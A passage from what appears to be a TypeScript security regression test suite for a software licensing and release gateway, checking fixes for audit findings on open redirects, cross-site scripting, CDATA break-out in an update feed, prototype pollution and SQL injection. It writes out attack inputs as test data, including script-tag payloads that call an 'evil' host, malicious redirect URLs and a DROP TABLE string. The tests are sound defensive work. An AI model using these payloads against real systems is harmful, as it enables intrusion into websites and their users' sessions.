          ...DEFAULT_SERVICES,
          release: { enabled: true },
          distribution: { enabled: true },
        },
      }),
      "manifest",
      NOW,
    );
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json,
          created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      "https://example.com/releases/1.2.3",
      "authenticated",
      "authenticated",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      1,
      "sha",
      sourceUrl,
      null,
      null,
      "authenticated",
      null,
      NOW,
    );
  }

  async function portalSession(
    env: Env,
    db: Db,
  ): Promise<{ cookie: string; csrf: string }> {
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    const { token, session } = await issuePortalSession(
      env,
      {
        accountId: account.id,
        email: account.primary_email,
        name: account.display_name,
      },
      NOW,
    );
    return { cookie: `${PORTAL_COOKIE}=${token}`, csrf: session.csrf };
  }

  /** A second release/artifact pair, for the "repointed after minting" case. */
  async function seedArtifact2(db: Db, sourceUrl: string): Promise<void> {
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json,
          created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_2",
      "1.2.4",
      "DJDL 1.2.4",
      null,
      null,
      "https://github.com/acme/djdl/releases/tag/v1.2.4",
      "authenticated",
      "authenticated",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_2",
      "art_2",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      1,
      "sha",
      sourceUrl,
      null,
      null,
      "authenticated",
      null,
      NOW,
    );
  }

  async function mintDownloadUrl(
    env: Env,
    db: Db,
    releaseId = "rel_1",
    artifactId = "art_1",
  ): Promise<string> {
    const s = await portalSession(env, db);
    const path = `/api/releases/${SLUG}/${releaseId}/artifacts/${artifactId}/token`;
    const res = await handlePortalApi(
      req(`https://key.plrs.im${path}`, {
        method: "POST",
        headers: { cookie: s.cookie, [PORTAL_CSRF_HEADER]: s.csrf },
      }),
      env,
      db,
      path,
      NOW,
    );
    expect(res.status).toBe(201);
    const { url } = (await res.json()) as { url: string };
    return decodeURIComponent(url.replace("/download/", ""));
  }

  // RE-BASELINED (P2.T2): `release_artifacts` has a writer now, so the allowlist this finding
  // asked for is applied — see `portal/api.ts` `redirectableSourceUrl`, which is the SAME
  // predicate `release/github.ts` uses on GitHub's own redirects.
  it("FIXED: refuses any host outside the GitHub storage allowlist", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    await seedArtifact(db, "https://malware.attacker.example/pwn.dmg");

    // The refusal lands at MINT time, one layer earlier than the finding's PoC reached: a token
    // that could only ever be rejected is a row written and a URL handed to the user for
    // nothing. No token exists to redeem.
    const s = await portalSession(env, db);
    const path = `/api/releases/${SLUG}/rel_1/artifacts/art_1/token`;
    const minted = await handlePortalApi(
      req(`https://key.plrs.im${path}`, {
        method: "POST",
        headers: { cookie: s.cookie, [PORTAL_CSRF_HEADER]: s.csrf },
      }),
      env,
      db,
      path,
      NOW,
    );
    // The caller owns the product, so the refusal names its reason (nothing here can serve the
    // file) instead of a bare 404; either way no token is written and nothing redirects.
    expect(minted.status).toBe(409);
    expect(await minted.json()).toMatchObject({ error: "not_hosted" });
    expect(
      await db.first("SELECT 1 FROM release_download_tokens LIMIT 1"),
    ).toBeNull();

    // And a token minted BEFORE the artifact was repointed — the real shape of this attack,
    // since `source_url` is rewritten by a sync — is refused at redemption too.
    await seedArtifact2(db, "https://ok.githubusercontent.com/djdl.dmg");
    // A public repository, so the allowlisted URL is servable when the token is minted.
    await seedRepositoryVisibility(env, db, SLUG, "public");
    const token = await mintDownloadUrl(env, db, "rel_2", "art_2");
    await db.run(
      "UPDATE release_artifacts SET source_url = ? WHERE artifact_id = ?",
      "https://malware.attacker.example/pwn.dmg",
      "art_2",
    );
    const res = await handlePortalDownload(
      req(`https://key.plrs.im/download/${token}`),
      env,
      db,
      token,
      NOW,
    );
    expect(res.status).toBe(404);
    expect(res.headers.get("location")).toBeNull();
  });

  it("FIXED: still redirects to an allowlisted GitHub storage host", async () => {
    // The other direction, so the fix cannot be "refuse everything".
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    await seedArtifact(
      db,
      "https://github.com/acme/djdl/releases/download/v1.2.3/djdl.dmg",
    );
    // A stored GitHub URL reaches a browser only from a public repository.
    await seedRepositoryVisibility(env, db, SLUG, "public");

    const token = await mintDownloadUrl(env, db);
    const res = await handlePortalDownload(
      req(`https://key.plrs.im/download/${token}`),
      env,
      db,
      token,
      NOW,
    );
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toBe(
      "https://github.com/acme/djdl/releases/download/v1.2.3/djdl.dmg",
    );
  });

  // FIXED (R9-05b / R11-05): `markPortalDownloadUsed` is now a conditional UPDATE carrying
  // `AND used_at IS NULL`, and the handler treats `changes === 0` as "someone else spent it".
  // The decision moved into the statement, so exactly one of N concurrent redemptions wins no
  // matter how the awaits interleave.
  it("single-use marking is now a compare-and-swap: only one redemption wins", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    // An allowlisted host, so this test exercises the single-use race rather than stopping at
    // the host check the tests above cover.
    await seedArtifact(db, "https://objects.githubusercontent.com/djdl.dmg");
    await seedRepositoryVisibility(env, db, SLUG, "public");
    const token = await mintDownloadUrl(env, db);

    // Model real D1 write latency: the `used_at` UPDATE lands one turn late. Any
    // request that got past the `used_at != null` check in that window still wins.
    let release!: () => void;
    const gate = new Promise<void>((r) => {
      release = r;
    });
    const slow: Db = {
      all: db.all.bind(db),
      first: db.first.bind(db),
      batch: db.batch.bind(db),
      run: db.run.bind(db),
      runChanges: async (sql: string, ...params: unknown[]) => {
        if (sql.includes("used_at = ?")) await gate;
        return db.runChanges(sql, ...(params as never[]));
      },
    } as unknown as Db;

    const call = () =>
      handlePortalDownload(
        req(`https://key.plrs.im/download/${token}`),
        env,
        slow,
        token,
        NOW,
      );
    const a = call();
    const b = call();
    // Let both requests get past the `used_at != null` check before either write lands.
    await new Promise((r) => setTimeout(r, 25));
    release();
    const [ra, rb] = await Promise.all([a, b]);
    // Exactly one redemption of a single-use token succeeds.
    expect([ra.status, rb.status].sort()).toEqual([302, 404]);

    // The UPDATE now carries the precondition that makes it a CAS.
    const repoSrc = readFileSync(
      join(
        HERE,
        "..",
        "..",
        "src",
        "services",
        "identity",
        "portal",
        "repo.ts",
      ),
      "utf8",
    );
    expect(repoSrc).toContain("used_at IS NULL");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-06 — safeReturnTo divergence between the product OIDC flow and the portal
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-06 safeReturnTo: /manage is allowed on the product flow, denied on the portal", () => {
  it("product /auth/start accepts return_to=/manage/... while the portal rejects it", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    env.PLATFORM_OIDC_ISSUER = "https://id.example";
    env.PLATFORM_OIDC_CLIENT_ID = "platform-client";
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;

    const res = await handleAuthStart(
      req(
        `https://key.plrs.im/${SLUG}/auth/start?return_to=${encodeURIComponent(
          "https://key.plrs.im/manage/api/products",
        )}`,
      ),
      env,
      db,
      product,
    );
    expect(res.status).toBe(302); // accepted
    const state = new URL(res.headers.get("location")!).searchParams.get(
      "state",
    )!;
    const flow = JSON.parse(
      (await artefacts(env).get(await flowKey(env, SLUG, state)))!,
    ) as { returnTo?: string };
    expect(flow.returnTo).toBe("https://key.plrs.im/manage/api/products");

    // The portal twin (portal/auth.ts:100) refuses the same value.
    const portal = await handlePortalLogin(
      req(
        `https://key.plrs.im/login?return_to=${encodeURIComponent(
          "https://key.plrs.im/manage/api/products",
        )}`,
      ),
      env,
      db,
    );
    expect(portal.status).toBe(400);
  });

  it("REFUTED: cross-origin return_to is rejected by both (origin comparison is sound)", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;
    for (const evil of [
      "https://evil.example/",
      "//evil.example/",
      "https://key.plrs.im.evil.example/",
      "javascript:alert(1)",
      "https:/\\evil.example/",
    ]) {
      const res = await handleAuthStart(
        req(
          `https://key.plrs.im/${SLUG}/auth/start?return_to=${encodeURIComponent(evil)}`,
        ),
        env,
        db,
        product,
      );
      expect([400]).toContain(res.status);
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-07 — stripMarkdown is not an HTML sanitizer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-07 extractSummary passes raw HTML/script through", () => {
  it("keeps <script>, <img onerror>, and event handlers verbatim in `summary`", () => {
    const body = `<!-- pkey:summary -->
<img src=x onerror=alert(document.domain)><script>fetch('//evil')</script>
<!-- /pkey:summary -->`;
    const summary = extractSummary(body, "pkey:summary")!;
    expect(summary).toContain("<img src=x onerror=alert(document.domain)>");
    expect(summary).toContain("<script>");
    // stripMarkdown only removes emphasis/link/list/heading syntax.
  });

  it("the fallback paragraph path is equally unsanitized", () => {
    const summary = extractSummary("<svg onload=alert(1)>\n\n## Changes")!;
    expect(summary).toBe("<svg onload=alert(1)>");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-08 — appcast CDATA break-out (latent: descriptionHtml is never populated)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-08 renderAppcast CDATA `]]>` neutralization", () => {
  // RE-BASELINED (P2.T4). The finding was rated Info on one ground only: `descriptionHtml` had
  // no producer, so the sink was unreachable. P2.T4 gives it one — the curated changelog summary
  // is now wired into every appcast item — so the two assertions below replace the two that
  // documented the latency. Both directions of the fix are pinned: the CDATA section can no
  // longer be terminated, and the payload survives as inert text rather than being silently
  // dropped (a fix that ate the content would pass a weaker test and lose release notes).
  const BREAKOUT =
    "ok]]></description><enclosure url='https://evil'/><description><![CDATA[";

  function feedWith(descriptionHtml: string): string {
    return renderAppcast({
      channelTitle: "djdl",
      link: "https://key.plrs.im",
      items: [
        {
          title: "djdl 1.0.0",
          shortVersion: "1.0.0",
          build: "1.0.0",
          url: "https://key.plrs.im/djdl/release/dl/1.0.0/djdl-arm64.dmg",
          length: 1,
          pubDate: "Thu, 01 Jan 1970 00:00:00 GMT",
          descriptionHtml,
        },
      ],
    });
  }

  it("FIXED: descriptionHtml can no longer terminate the CDATA section", () => {
    const xml = feedWith(BREAKOUT);
    // The injected element's TEXT is still in the byte stream — that is the point of a
    // neutralisation rather than a filter — but it is character data, not markup: the
    // `</description>` that would have closed the element early no longer does, so the payload
    // never leaves the description and exactly one enclosure (the real one) exists.
    const descStart = xml.indexOf("<description><![CDATA[");
    const descEnd = xml.indexOf("]]></description>");
    expect(descStart).toBeGreaterThan(-1);
    expect(xml.indexOf("<enclosure url='https://evil'/>")).toBeGreaterThan(
      descStart,
    );
    expect(xml.indexOf("<enclosure url='https://evil'/>")).toBeLessThan(
      descEnd,
    );
    // Outside the description — where markup actually is markup — there is exactly one
    // enclosure, and it is the gateway's own.
    const afterDescription = xml.slice(descEnd);
    expect(afterDescription.match(/<enclosure /g)).toHaveLength(1);
    expect(xml).toContain(
      '<enclosure url="https://key.plrs.im/djdl/release/dl/1.0.0/djdl-arm64.dmg"',
    );
    // The split-encode is what does it: `]]` closes, `]]>` re-opens, `>` is character data.
    expect(xml).toContain("]]]]><![CDATA[>");
  });

  it("FIXED: a `]]><script>` payload renders inert, and is not dropped", () => {
    const xml = feedWith("notes ]]><script>alert(1)</script> more");
    expect(xml).not.toContain("]]><script>");
    // Still inside the description, still readable — neutralised, not censored.
    const description = xml.slice(
      xml.indexOf("<description>"),
      xml.indexOf("</description>") + "</description>".length,
    );
    expect(description).toContain("notes ");
    expect(description).toContain("script>alert(1)");
    expect(description.endsWith("]]></description>")).toBe(true);
    // Nothing escaped the element: the feed still has one enclosure and no stray tags.
    expect(xml.match(/<enclosure /g)).toHaveLength(1);
  });

  it("ARMED: the appcast now populates descriptionHtml from the changelog summary", () => {
    // The premise of the Info rating is gone. Both layers are asserted at their sources: the
    // producer escapes the prose (`proseToHtml`), and the renderer neutralises `]]>`.
    const feed = readFileSync(
      join(HERE, "..", "..", "src", "services", "update", "feed.ts"),
      "utf8",
    );
    expect(feed).toContain("descriptionHtml: proseToHtml(summary)");
    expect(feed).toContain("extractSummary(release.body, cfg.summary_marker)");
    const renderer = readFileSync(
      join(HERE, "..", "..", "src", "services", "update", "appcast.ts"),
      "utf8",
    );
    expect(renderer).toContain("neutralizeCdata(item.descriptionHtml)");
  });

  it("FIXED: the wired summary is HTML-escaped before it reaches the feed", () => {
    // R9-07 next door proves `extractSummary` leaves raw HTML intact — `stripMarkdown` is not a
    // sanitiser. The producer therefore escapes it, so a release note carrying `<script>` lands
    // as text in Sparkle's release-notes view rather than as markup.
    const summary = extractSummary(
      "<img src=x onerror=alert(1)>\n\n## Changes",
    )!;
    expect(proseToHtml(summary)).toBe("&lt;img src=x onerror=alert(1)&gt;");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-09 — prototype pollution probes against applyOverrides (REFUTED)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-09 applyOverrides prototype-pollution probes", () => {
  const catalogWith = (key: string) =>
    new Catalog({
      schemaVersion: 1,
      entries: [
        {
          key,
          kind: "value",
          category: "general",
          label: key,
          schema: {},
          default: null,
        },
      ],
    } as never);

  it("REFUTED: a `__proto__` catalog key does not pollute Object.prototype", async () => {
    // applyOverrides is async and env/product-aware since R12-02 (managed secrets are sealed
    // under PLATFORM_KEK before they reach D1). These keys are `kind: "value"`, so nothing is
    // sealed here and the pollution behaviour under test is unchanged.
    const res = await applyOverrides(
      makeEnv(new KvMock(), ["djdl"]),
      "djdl",
      { config: {}, secrets: {}, entitlements: {} },
      [{ key: "__proto__", state: "enforced", value: "pwned" }],
      catalogWith("__proto__"),
      NOW,
    );
    expect(res.ok).toBe(true);
    expect(({} as Record<string, unknown>)["state"]).toBeUndefined();
    expect(({} as Record<string, unknown>)["value"]).toBeUndefined();
    if (!res.ok) return;
    // The assignment hits the Object.prototype __proto__ SETTER, so it silently
    // vanishes from the serialized payload instead of being stored.
    expect(JSON.parse(JSON.stringify(res.payload)).config).toEqual({});
  });

  it("REFUTED: `constructor` / `prototype` keys only shadow on the local object", async () => {
    for (const key of ["constructor", "prototype", "toString"]) {
      const res = await applyOverrides(
        makeEnv(new KvMock(), ["djdl"]),
        "djdl",
        { config: {}, secrets: {}, entitlements: {} },
        [{ key, state: "enforced", value: 1 }],
        catalogWith(key),
        NOW,
      );
      expect(res.ok).toBe(true);
      if (!res.ok) continue;
      const round = JSON.parse(JSON.stringify(res.payload)) as {
        config: Record<string, unknown>;
      };
      expect(round.config[key]).toBeDefined();
    }
    // Object.prototype itself is untouched.
    expect(Object.prototype.hasOwnProperty.call({}, "state")).toBe(false);
    expect(typeof ({} as { constructor: unknown }).constructor).toBe(
      "function",
    );
  });

  it("catalog PUBLISH has no key-name allowlist (the precondition is real)", () => {
    const c = catalogWith("__proto__");
    expect(c.entryByKey("__proto__")).toBeDefined();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-10 — KV key scoping (REFUTED for cross-namespace) + linkRepo mis-scoping
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-10 KV key construction", () => {
  it("REFUTED: a `:`-bearing state cannot escape its own key namespace", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedCustomOidc(db, "https://id.example", { redirectUris: null });
    const product = (await loadProduct(env, db, SLUG))!;

    // Plant a device-flow record and try to reach it through the plain flow reader.
    await artefacts(env).put(
      await deviceFlowKey(env, SLUG, "VICTIM"),
      JSON.stringify({ x: 1 }),
    );
    await kv.put(`p:${SLUG}:token:VICTIMHASH`, JSON.stringify({ x: 1 }));

    // Every attacker-controlled component is the LAST segment of its key, and no
    // namespace prefix is a prefix of another, so no crafted value collides.
    for (const evil of [
      "../device-flow:VICTIM",
      ":device-flow:VICTIM",
      "..:token:VICTIMHASH",
    ]) {
      const res = await handleAuthCallback(
        req(
          `https://key.plrs.im/${SLUG}/identity/auth/callback?code=c&state=${encodeURIComponent(evil)}`,
        ),
        env,
        db,
        product,
        NOW,
      );
      expect(res.status).toBe(400); // "unknown state" — never resolves cross-namespace
    }
    expect(
      await artefacts(env).get(await deviceFlowKey(env, SLUG, "VICTIM")),
    ).not.toBeNull();
  });

  // FIXED (R5-03), now on both halves. `getInstallationToken` derives the cache key itself
  // from `(installId, down-scope)` rather than from the caller's argument, AND the two callers
  // that used to pass a bare repo name — `linkRepo.ts` and `resync.ts` — now pass a structured
  // `{owner, repo}` scope, so they no longer take the legacy installation-wide path at all.
  it("the installation-token cache key no longer comes from the caller's scope argument", () => {
    const src = readFileSync(
      join(HERE, "..", "..", "src", "services", "release", "linkRepo.ts"),
      "utf8",
    );
    // The bare-repo-name call site is gone; the scope is structured.
    expect(src).not.toContain(
      "getInstallationToken(env, repo, installId, now, fetchImpl)",
    );
    expect(src.replace(/\s+/g, " ")).toContain(
      "getInstallationToken( env, { owner, repo }, installId, now, fetchImpl, )",
    );
    // ...yet a repo-name caller and a slug caller can no longer collide: neither string
    // reaches the key, and the two down-scopes are distinct entries.
    const legacy = installationTokenSlot(42, SLUG).key;
    const scoped = installationTokenSlot(42, {
      owner: "acme",
      repo: SLUG,
    }).key;
    expect(legacy).not.toBe(scoped);
    expect(scoped).toBe(`gh:install:42:token:acme/${SLUG}`);
    // The old key shape — `p:<whatever-the-caller-passed>:gh-token:<id>` — is gone entirely.
    expect(scoped.startsWith("p:")).toBe(false);
    expect(legacy.startsWith("p:")).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-11 — /<product>/mint/<id>/auth serves stored HTML with no auth and no CSP
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-11 edge-mint auth page", () => {
  it("serves auth_page_template as raw HTML, unauthenticated — but FIXED (R1-05): with a script-free CSP", async () => {
    const db = makeTestDb();
    await seedProduct(db, SLUG);
    await db.run(
      `INSERT INTO edge_mint_config
         (product, id, alg, signing_key_secret, kid, claims_template_json,
          ttl_seconds, audience, auth_page_template)
       VALUES (?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "musickit",
      "ES256",
      "MINT_KEY",
      "kid",
      "{}",
      3600,
      null,
      "<script>alert(document.domain)</script>",
    );

    const res = await handleMintAuth(db, makeProduct(), "musickit");
    expect(res.status).toBe(200);
    expect(await res.text()).toBe("<script>alert(document.domain)</script>");
    expect(res.headers.get("content-type")).toBe("text/html; charset=utf-8");
    // FIXED (R1-05/R1-09). The stored HTML is still echoed verbatim, but `default-src 'none'`
    // stops the injected <script> from executing on the platform origin.
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("x-frame-options")).toBe("DENY");
  });

  it("REFUTED (today): no code path writes auth_page_template", () => {
    const repoSrc = readFileSync(
      join(HERE, "..", "..", "src", "repo.ts"),
      "utf8",
    );
    // The only INSERT that touches the column hardcodes NULL.
    expect(repoSrc).toContain("ttl_seconds, audience, auth_page_template)");
    expect(repoSrc).toContain("VALUES (?, ?, ?, ?, ?, ?, ?, ?, NULL)");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-12 — escapeHtml omits `'`; verify every interpolation is safe today
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-12 escapeHtml coverage", () => {
  it('REFUTED (today): the device-verify page escapes `<>&"` and every sink is a text node or a double-quoted attr', () => {
    const src = readFileSync(
      join(HERE, "..", "..", "src", "services", "identity", "oidc.ts"),
      "utf8",
    );
    expect(src).toContain('.replace(/"/g, "&quot;")');
    expect(src).not.toContain("&#39;");
    // CHANGED by the R8-02 fix: confirmation is no longer a bare `<a href>` GET link. It is
    // now a POST form carrying a CSRF token, so a GET can neither mutate the flow nor leak
    // `state` via the Location header. Assert the escaping invariant on the new markup —
    // both attribute interpolations remain double-quoted and escapeHtml-wrapped.
    //
    // CHANGED again by P1-06: the page renderer is shared by `/device/verify` and the RFC 8628
    // user-code page, so the action is a parameter and the form may carry extra hidden fields
    // (the user code). Every one of those interpolations is still double-quoted and escaped.
    expect(src).toContain(
      '<form method="post" action="${escapeHtml(action)}">',
    );
    expect(src).toContain('name="csrf" value="${escapeHtml(csrf)}"');
    expect(src).toContain(
      '<input type="hidden" name="${escapeHtml(name)}" value="${escapeHtml(value)}">',
    );
  });

  it("REFUTED (today): portal email escapes into a double-quoted href / text node", () => {
    const src = readFileSync(
      join(
        HERE,
        "..",
        "..",
        "src",
        "services",
        "identity",
        "portal",
        "email.ts",
      ),
      "utf8",
    );
    // Both sinks escape: the action URL into a double-quoted href (and its visible copy), and
    // every paragraph into a text node.
    expect(src).toContain('href="${escapeHtml(c.action.url)}"');
    expect(src).toContain('${escapeHtml(text).replace(/\\n/g, "<br>")}</p>');
  });

  it("REFUTED: the rendered portal email escapes a hostile link, subject and paragraph", async () => {
    const { renderEmail } =
      await import("../../src/services/identity/portal/email.js");
    const html = renderEmail({
      subject: '<img src=x onerror="alert(1)">',
      heading: "</h1><script>alert(1)</script>",
      paragraphs: ['a"b<c>\nd'],
      action: { label: "<b>Go</b>", url: 'https://x.test/?a="><script>' },
      footer: "<i>f</i>",
      origin: null,
    });
    expect(html).not.toMatch(/<script|<img|<b>|<i>|onerror="/i);
    expect(html).toContain('href="https://x.test/?a=&quot;&gt;&lt;script&gt;"');
    expect(html).toContain("a&quot;b&lt;c&gt;<br>d");
  });

  it("the device-verify HTML page ships with no headers of its own — the dispatcher backstop adds them", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await artefacts(env).put(
      await deviceFlowKey(env, SLUG, "DC"),
      JSON.stringify({
        state: "s",
        deviceId: "dev-1",
        userCode: "ABCD-1234",
        authorizeUrl: "https://id.example/authorize",
        deviceName: "Ada's Mac",
      }),
    );
    const { handleAuthDeviceVerify } =
      await import("../../src/services/identity/oidc.js");
    const res = await handleAuthDeviceVerify(
      req(`https://key.plrs.im/${SLUG}/auth/device/verify?device_code=DC`),
      env,
      makeProduct(),
    );
    expect(res.status).toBe(200);
    const html = await res.text();
    // The apostrophe survives escapeHtml — harmless in a text node, but it is the
    // reason this helper must never be reused in a single-quoted attribute.
    expect(html).toContain("Ada's Mac");
    // FIXED at the handler — `oidc.ts` now adopts `staticHtmlSecurityHeaders` directly, so
    // the page is hardened even when the handler is called without the dispatcher.
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
    // FIXED (R1-09) at the dispatcher: index.ts pipes every response through
    // `secureResponse`, which supplies a CSP to any HTML response that lacks one. That
    // apostrophe is why `style-src 'unsafe-inline'` is the only inline allowance in the
    // static policy — scripts stay fully blocked by `default-src 'none'`.
    const { secureResponse } = await import("../../src/securityHeaders.js");
    const served = secureResponse(
      new Response(html, {
        status: 200,
        headers: { "content-type": "text/html; charset=utf-8" },
      }) as unknown as Response,
    );
    expect(served.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    expect(served.headers.get("x-frame-options")).toBe("DENY");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-13 — SQL: dynamic SET clauses (REFUTED as exploitable today)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-13 dynamic `SET ${col} = ?` builders", () => {
  it("REFUTED: every key reaching updateProduct/patchLicense is a hardcoded literal", () => {
    const products = readFileSync(
      join(HERE, "..", "..", "src", "admin", "handlers", "products.ts"),
      "utf8",
    );
    // §R1 moved the licence admin handler under the service that owns it
    // (`license/licenses`); the property this pins is about the CALL SITE, so it follows.
    const licenses = readFileSync(
      join(
        HERE,
        "..",
        "..",
        "src",
        "services",
        "license",
        "admin",
        "licenses.ts",
      ),
      "utf8",
    );
    // No spread of request data into the field object at either call site.
    expect(products).not.toMatch(/updateProduct\(\s*db,\s*slug,\s*\{\s*\.\.\./);
    expect(licenses).not.toMatch(
      /patchLicense\(\s*db,\s*slug,\s*id,\s*\{\s*\.\.\./,
    );
    expect(products).toContain('name: typeof body.name === "string"');
  });

  it("values are always bound, never interpolated (D1Db + SqliteDb both bind)", async () => {
    const db = makeTestDb();
    await seedProduct(db, SLUG);
    const evil = "x'); DROP TABLE products; --";
    await db.run("UPDATE products SET name = ? WHERE slug = ?", evil, SLUG);
    const row = await db.first<{ name: string }>(
      "SELECT name FROM products WHERE slug = ?",
      SLUG,
    );
    expect(row?.name).toBe(evil);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-14 — handleRelease's NotFoundError -> 404 mapping is dead (async return-in-try)
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-14 handleRelease try/catch never catches", () => {
  it("a missing release REJECTS instead of returning the documented clean 404", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db);
    await seedGhToken(env);
    const { fetchImpl } = recordingFetchImpl([]); // no releases at all

    // FIXED (R9-14 / R6-08): every branch is now `return harden(await handler(...))`
    // inside the try, so `NotFoundError` reaches the catch and maps to the documented
    // clean 404 instead of escaping as an unhandled rejection (500).
    const res = await handleRelease(
      req(`https://key.plrs.im/${SLUG}/version`),
      env,
      db,
      makeProduct(),
      "version",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
  });

  it("only the synchronous `install` branch and the `!cfg` guard return a real 404", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG); // no release_config row
    const { fetchImpl } = recordingFetchImpl([]);
    const res = await handleRelease(
      req(`https://key.plrs.im/${SLUG}/version`),
      env,
      db,
      makeProduct(),
      "version",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-16 — fetchRepoFile fetched and decoded an unbounded `.pkey/` body
// ═════════════════════════════════════════════════════════════════════════════
//
// R7-02's cap landed at the PARSER (`MAX_MANIFEST_BYTES`, on the decoded manifest). That is
// the wrong end of a 128 MB isolate to discover that a repo writer committed a 200 MB
// `.pkey/product.yaml`: `fetchRepoFile` had already buffered the whole JSON envelope and
// base64-decoded it before `parseDocument` got a look. The cap is now enforced at the fetch as
// well, on the response body, with headroom for base64 + envelope.
describe("R9-16 fetchRepoFile response-body cap", () => {
  /** A body of `chunks × bytes`, counting how many chunks the reader actually pulled. */
  function countingBody(
    chunks: number,
    bytes: number,
    seen: { pulled: number },
  ): ReadableStream<Uint8Array> {
    return new ReadableStream<Uint8Array>({
      pull(c) {
        if (seen.pulled >= chunks) {
          c.close();
          return;
        }
        seen.pulled += 1;
        c.enqueue(new Uint8Array(bytes));
      },
    });
  }

  it("refuses a declared over-cap Content-Length before consuming the body", async () => {
    const seen = { pulled: 0 };
    const fetchImpl: FetchImpl = async () =>
      new Response(countingBody(64, 64 * 1024, seen), {
        status: 200,
        headers: { "content-length": String(MAX_REPO_FILE_BYTES + 1) },
      }) as unknown as Response;

    // The `: <n> bytes` form (rather than `: >…`) is the tell: this is the DECLARED-size
    // short-circuit, taken before a single byte was accounted for.
    await expect(
      fetchRepoFile("tok", "acme", "app", ".pkey/product.yaml", fetchImpl),
    ).rejects.toThrow(
      new RegExp(`repo file too large: ${MAX_REPO_FILE_BYTES + 1} bytes`),
    );
    // Whatever the stream implementation prefetched, the 4 MB body was never drained.
    expect(seen.pulled).toBeLessThan(16);
  });

  it("a MISSING Content-Length cannot defeat the cap — the streamed accounting enforces it", async () => {
    const seen = { pulled: 0 };
    const fetchImpl: FetchImpl = async () =>
      // No `content-length` at all: the header check is the cheap path, not the enforcement.
      new Response(countingBody(64, 64 * 1024, seen), {
        status: 200,
      }) as unknown as Response;

    await expect(
      fetchRepoFile("tok", "acme", "app", ".pkey/product.yaml", fetchImpl),
    ).rejects.toThrow(
      new RegExp(`repo file too large: >${MAX_REPO_FILE_BYTES} bytes`),
    );
